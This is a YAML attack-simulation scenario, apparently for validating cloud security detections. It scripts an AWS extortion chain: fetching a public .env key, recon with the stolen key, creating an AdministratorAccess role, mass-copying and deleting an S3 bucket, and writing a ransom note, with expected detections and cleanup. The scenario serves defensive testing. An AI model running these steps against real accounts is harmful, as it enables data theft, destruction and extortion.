@@ -1,0 +1,261 @@
+scenario_id: SIM-CSPM-005
+name: "Code-to-Cloud Extortion — Exposed IAM Key to Stolen-Key S3 Mass-Export + Ransom (Cortex Cloud CSPM)"
+version: "1.0"
+status: active
+
+plane: CSPM
+detection_types:
+  - XQL
+  - Correlation
+  - IOC
+
+# ── UC/TC Alignment ─────────────────────────────────────────────────────────
+# Cortex Use Case Index Master v2.0 Cloud/Posture family:
+#   Code-to-Cloud Traceability → TC-CSPM-05 (LEAD tier — F9), the exposure-to-
+#   runtime-to-impact correlation companion to the flat-scan (TC-CSPM-01) and
+#   drift (TC-CSPM-02) posture stories.
+uc_ref: UC-CSPM-005
+tc_ref: TC-CSPM-005
+uc_name: "Code-to-Cloud Traceability — Exposed Secret to Cloud Extortion"
+tc_name: "Exposed IAM Key Fused to Stolen-Key S3 Mass-Export + Ransom"
+
+# ── MITRE ATT&CK Mapping ────────────────────────────────────────────────────
+# Code-to-cloud extortion chain: a long-lived key exposed in a public .env
+# (Credentials In Files) is used as a valid cloud account, runs cloud account
+# discovery, escalates via an additional cloud role, then loots + destroys +
+# ransoms S3 storage.
+mitre_tactic: "TA0006"
+mitre_tactic_name: "Credential Access"
+mitre_technique: "T1552.001"
+mitre_technique_name: "Unsecured Credentials: Credentials In Files"
+additional_techniques:
+  - technique: "T1078.004"
+    name: "Valid Accounts: Cloud Accounts"
+  - technique: "T1087.004"
+    name: "Account Discovery: Cloud Account"
+  - technique: "T1098.003"
+    name: "Account Manipulation: Additional Cloud Roles"
+  - technique: "T1530"
+    name: "Data from Cloud Storage"
+  - technique: "T1485"
+    name: "Data Destruction"
+  - technique: "T1657"
+    name: "Financial Theft"
+
+# ── Threat Intelligence ─────────────────────────────────────────────────────
+threat_report: "Unit 42 — Leaked Environment Variables Allow Large-Scale Cloud Extortion Operation"
+threat_report_url: "https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/"
+
+# ── Execution Configuration ─────────────────────────────────────────────────
+# "Execute-against-cloud-API" chain, not an in-host TTP. Runs from the SimCore
+# container / jumpbox; the identity wraps curl + AWS CLI calls against disposable,
+# CortexSimExtortionTarget-tagged lab resources with a scoped long-lived lab key.
+# SAFE-MODE: every S3 object mass-read/deleted/ransom-noted is a seeded fixture
+# restored by cleanup + the cspm module lifecycle; the lambda-ex role is removed.
+# destructive=false.
+execution_identity:
+  default: root
+  options:
+    - root
+    - www-data
+
+push_supported: true
+pull_supported: false
+
+# ── External Tools (adapter-backed) ─────────────────────────────────────────
+external_tools:
+  - name: aws-cli
+    source: "https://aws.amazon.com/cli/"
+    type: binary
+    install_inline: false
+  - name: curl
+    type: binary
+    install_inline: false
+
+# ── Infra Prerequisites ─────────────────────────────────────────────────────
+infra_modules_needed:
+  - base
+  - cspm
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Code-to-Cloud Traceability & Cross-Signal Correlation"
+methodology_family: "F9"
+primary_kpi: "Correlation Coverage"
+threshold:
+  kpi: "Code-to-Cloud Chain Correlation Coverage"
+  op: "≥"
+  value: 100
+  unit: "%"
+success_criteria: |
+  A long-lived IAM access key exposed in a public .env on a web asset (leg A,
+  code-to-cloud) is used from an off-baseline Tor/VPN source to run a
+  GetCallerIdentity/ListUsers/ListBuckets recon burst and escalate via
+  CreateRole('lambda-ex') + AttachRolePolicy(AdministratorAccess) (leg B), then
+  to mass GetObject/DeleteObject a seeded S3 bucket and PutObject a ransom note
+  into the emptied bucket (leg C). Cortex surfaces each leg and correlation
+  CR-CSPM-0005 fuses leg A to leg B on the exposed accessKeyId and leg B to
+  leg C on the principal — the off-baseline src_ip riding along as evidence —
+  into ONE code-to-cloud extortion incident naming the exposed key, the escalated
+  principal, the anonymizing source, and the ransom-noted bucket. This is the
+  "the exposed secret is what looted the bucket" proof: exposure, abuse, and
+  ransom traced as a single story, not three disconnected findings.
+moat_tier: "LEAD"
+
+# ── Causality Group Owner ───────────────────────────────────────────────────
+# This is an "execute-against-cloud-API" chain run from the jumpbox / SimCore
+# container: the operator aws-CLI/curl session OWNS the control-plane + data-plane
+# chain and is the process XDR would blame — NOT the beacon. step-01 (confirm the
+# code-to-cloud exposure of the .env / long-lived key) is the single root; step-02
+# uses that exposed key (exposure_exploit); step-03 escalates on the same
+# accessKeyId/principal (shared_entity); step-04 turns the escalated access into
+# S3 impact (exploit_impact); step-05 correlates the whole chain (shared_entity).
+cgo_anchor:
+  image_name: "aws"
+  primary_username: "root"
+
+# ── Steps ───────────────────────────────────────────────────────────────────
+steps:
+  - id: step-01
+    name: "Confirm the code-to-cloud exposure — public .env carrying the long-lived lab key"
+    command: |
+      echo '[CSPM-005] Confirming the code-to-cloud exposure: public .env serving the long-lived lab access key';
+      curl -fsS --max-time 8 'http://cortexsim-exposed-asset.example/.env' 2>/dev/null | head -c 200 || echo '[*] exposed-.env fetch attempted — Cortex Cloud should flag the long-lived IAM access key as publicly reachable (code-to-cloud exposure)';
+      echo '[*] Exposure confirmed for the CortexSimExtortionTarget-tagged long-lived key'
+    identity: root
+    mitre_technique: "T1552.001"
+    platforms: ["linux", "container"]
+    expected_detections:
+      - plane: CSPM
+        type: XQL
+        description: "Cortex Cloud posture flags a long-lived IAM access key as publicly reachable in a .env on a web asset — the code-to-cloud exposure (leg A) that makes the key usable, carrying the exposed_access_key_id that joins the runtime legs."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "xql-cspm-005-exposed-long-lived-iam-access-key-code-to-cloud-finding"
+
+  - id: step-02
+    name: "Stolen-key recon burst from an off-baseline source"
+    command: |
+      echo '[CSPM-005] Using the exposed lab key from an off-baseline source for a recon burst';
+      AWS_ACCESS_KEY_ID='AKIAIOSFODNN7EXAMPLE' aws sts get-caller-identity --profile cortexsim-lab 2>/dev/null || echo '[*] GetCallerIdentity attempted with the exposed key';
+      aws iam list-users --profile cortexsim-lab 2>/dev/null || echo '[*] ListUsers attempted';
+      aws s3api list-buckets --profile cortexsim-lab 2>/dev/null || echo '[*] ListBuckets attempted';
+      echo '[*] Recon burst issued — Cortex should observe GetCallerIdentity/ListUsers/ListBuckets by the exposed accessKeyId from a Tor/VPN source'
+    identity: root
+    mitre_technique: "T1087.004"
+    platforms: ["linux", "container"]
+    causality:
+      # The exposed secret from step-01 is now USED: a posture exposure abused at
+      # runtime, so the edge is exposure_exploit (exposure -> exploitation pivot).
+      parent_step: step-01
+      pivot: exposure_exploit
+    expected_detections:
+      - plane: CSPM
+        type: XQL
+        description: "The exposed accessKeyId issues a GetCallerIdentity -> ListUsers -> ListBuckets reconnaissance burst in cloud_audit_logs (leg B start) — the stolen key orienting inside the account."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "xql-cspm-005-stolen-key-recon-burst-from-off-baseline-source"
+      - plane: CSPM
+        type: XQL
+        description: "The same accessKeyId is used from a Tor-exit / VPN source off the account's baseline — the anonymizing infrastructure the campaign used, carried as evidence on the correlated incident."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "xql-cspm-005-stolen-key-used-from-tor-vpn-source-off-account-baseline"
+
+  - id: step-03
+    name: "Privilege escalation — CreateRole lambda-ex + AttachRolePolicy AdministratorAccess"
+    command: |
+      echo '[CSPM-005] Escalating with the stolen key — CreateRole lambda-ex + AttachRolePolicy AdministratorAccess';
+      aws iam create-role --role-name lambda-ex --assume-role-policy-document file:///dev/null --profile cortexsim-lab 2>/dev/null || echo '[*] CreateRole lambda-ex attempted';
+      aws iam attach-role-policy --role-name lambda-ex --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile cortexsim-lab 2>/dev/null || echo '[*] AttachRolePolicy AdministratorAccess attempted';
+      echo '[*] Escalation issued — Cortex should attribute CreateRole/AttachRolePolicy(Admin) to the same stolen accessKeyId/principal'
+    identity: root
+    mitre_technique: "T1098.003"
+    platforms: ["linux", "container"]
+    causality:
+      # Same stolen accessKeyId / principal continuing from the recon burst; no
+      # process fork — the join is the shared credential identity (shared_entity).
+      parent_step: step-02
+      pivot: shared_entity
+    expected_detections:
+      - plane: CSPM
+        type: XQL
+        description: "The stolen accessKeyId escalates: CreateRole named 'lambda-ex' plus AttachRolePolicy attaching the AWS-managed AdministratorAccess policy (leg B escalation) — the exact tradecraft the report documents, attributed to the same principal."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "xql-cspm-005-privilege-escalation-createrole-lambda-ex-attachrolepolicy-admin"
+
+  - id: step-04
+    name: "Impact — S3 mass-export + delete then ransom-note into the emptied bucket"
+    command: |
+      echo '[CSPM-005] SAFE-MODE impact against the disposable seeded bucket — mass-export, delete, ransom note';
+      aws s3 cp 's3://cortexsim-extortion-target/' /tmp/cortexsim-export --recursive --profile cortexsim-lab 2>/dev/null || echo '[*] S3 mass GetObject (export) attempted';
+      aws s3 rm 's3://cortexsim-extortion-target/' --recursive --profile cortexsim-lab 2>/dev/null || echo '[*] S3 DeleteObject (empty bucket) attempted';
+      printf 'CortexSim SAFE-MODE ransom-note fixture — your data has been copied.' | aws s3 cp - 's3://cortexsim-extortion-target/recover_your_data.txt' --profile cortexsim-lab 2>/dev/null || echo '[*] ransom-note PutObject attempted';
+      echo '[*] Impact issued — Cortex should observe GetObject/DeleteObject volume then a ransom-note PutObject by the stolen key'
+    identity: root
+    mitre_technique: "T1530"
+    platforms: ["linux", "container"]
+    causality:
+      # The escalated access from step-03 is turned into concrete S3 impact
+      # (loot + destroy + ransom) — the exploit -> impact pivot.
+      parent_step: step-03
+      pivot: exploit_impact
+    expected_detections:
+      - plane: CSPM
+        type: XQL
+        description: "The stolen key mass GetObject then DeleteObject the target bucket in cloud_audit_logs (leg C) — data theft followed by emptying the bucket, the data-destruction impact."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "xql-cspm-005-s3-mass-export-and-delete-impact"
+      - plane: CSPM
+        type: XQL
+        description: "A ransom-note PutObject (recover_your_data.txt) lands in the just-emptied bucket — the extortion payload, data-theft ransom without encryption."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "xql-cspm-005-ransom-note-putobject-into-emptied-bucket"
+
+  - id: step-05
+    name: "Correlation fuses the exposure, stolen-key abuse, and S3 ransom into one incident"
+    command: |
+      echo '[CSPM-005] Reconciling the code-to-cloud chain — one incident joined on the shared accessKeyId/principal';
+      echo '[*] Expected legs: A exposed-key posture finding, B stolen-key recon+escalation, C S3 mass-export+delete+ransom-note';
+      echo '[*] Correlation CR-CSPM-0005 should fuse A->B on the exposed accessKeyId and B->C on the principal, with the Tor/VPN src_ip as evidence, into one code-to-cloud extortion incident'
+    identity: root
+    mitre_technique: "T1657"
+    platforms: ["linux"]
+    causality:
+      # Correlation terminal — CR-CSPM-0005 converges all three legs on the shared
+      # exposed accessKeyId / principal. The convergence edge is shared_entity.
+      parent_step: step-04
+      pivot: shared_entity
+    expected_detections:
+      - plane: CSPM
+        type: Correlation
+        description: "Correlation CR-CSPM-0005 fuses leg A (exposed long-lived key), leg B (off-baseline recon + CreateRole lambda-ex/AttachRolePolicy Admin), and leg C (S3 mass-export/delete + ransom note) into a single code-to-cloud extortion incident joined on the shared accessKeyId (A->B) and principal (B->C), naming the exposed key, the escalated principal, the anonymizing source, and the ransom-noted bucket."
+        ttp_ref: "TTP-2026-0153"
+        detection_id: "CR-CSPM-0005"
+
+# ── Cleanup ─────────────────────────────────────────────────────────────────
+# Reverses every mutation: detach + delete the lambda-ex role and remove the
+# ransom-note fixture. The seeded bucket objects are restored by the cspm
+# Terraform module lifecycle, so the run is fully reversible (destructive=false).
+cleanup:
+  commands:
+    - "aws iam detach-role-policy --role-name lambda-ex --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile cortexsim-lab 2>/dev/null || echo detach-role-policy-skipped"
+    - "aws iam delete-role --role-name lambda-ex --profile cortexsim-lab 2>/dev/null || echo delete-role-skipped"
+    - "aws s3 rm 's3://cortexsim-extortion-target/recover_your_data.txt' --profile cortexsim-lab 2>/dev/null || echo remove-ransom-note-skipped"
+    - "rm -rf /tmp/cortexsim-export"
+    - "echo cortexsim-cspm-005-cleanup-complete-lab-restored"
+
+# ── Provenance ──────────────────────────────────────────────────────────────
+author: "Henry Reed"
+created: "2026-07-24"
+last_updated: "2026-07-24"
+tags:
+  - cspm
+  - code-to-cloud
+  - exposed-secret
+  - long-lived-access-key
+  - stolen-key-abuse
+  - s3-mass-export
+  - ransom
+  - cloud-extortion
+  - correlation
+  - aws
+  - lead
+  - v2.0-methodology
